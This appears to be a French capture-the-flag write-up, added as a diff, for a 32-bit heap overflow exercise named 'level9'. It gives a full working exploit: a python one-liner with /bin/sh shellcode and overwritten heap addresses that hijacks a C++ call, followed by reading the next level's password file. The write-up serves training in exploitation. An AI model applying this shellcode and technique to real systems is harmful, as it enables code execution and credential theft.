@@ -1,0 +1,43 @@
+# En observant le code on remarque que c'est peu comprensible, c'est du code c++.
+
+# On observe ce que les fonctions fond
+
+# '_Znwj' semble alouer une zone memoire
+# '_ZN1NC2Ei' semble ajouter l'adresse 0x08048848 dans cette zone memoire.
+
+# '_ZN1N13setAnnotationEPc' semble ecrire av[1] a 0x804a00c.
+
+# On voit ensuite que il y a un 'call' d'une adresse recupere de la zone memoire alouer juste avant.
+# On va naturelement essayer d'injecter du shell code et faire executer shell.
+
+# On commence par recuperer les adresse alouer.
+
+# Malloc 1 = 0x804a008
+# Malloc 2 = 0x804a078
+
+# La fonction qui copie argv[1], 0x804a00c.
+
+> x/16x 0x804a078
+
+0x804a078:      0x08048848      0x00000000      0x00000000      0x00000000
+0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a098:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0a8:      0x00000000      0x00000000      0x00000000      0x00000000
+
+# Il y a une adresse
+
+# Pour etre plus precis le programe va executer l'adresse a l'adresse 0x08048848.
+
+# On prepare notre shellcode
+
+./level9 `python -c 'print("\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"* 79 + "\x0c\xa0\x04\x08")'`
+$ cat /home/user/bonus0/.pass
+
+# Donc vu que la ou est copie av[1] est avant l'endroit ou l'adresse est recuperer on peut le changer.
+
+# \x10\xa0\x04\x08 qui correspond au debut de notre shell code (0x0804a00c + 0x4)
+# Puis le shell code
+# Puis des caractere pour arriver jusqu'a 0x804a078 (la ou l'adresse est recuperer)
+# et on y ecrit le l'adresse de l'adresse qui pointe vers notre shell code donc \x0c\xa0\x04\x08 (0x0804a00c)
+
+# Ainsi le programe va recuperer l'adresse du debut du buffer, et ensuite recuperer l'adresse du debut du shellcode, et enfin y jump
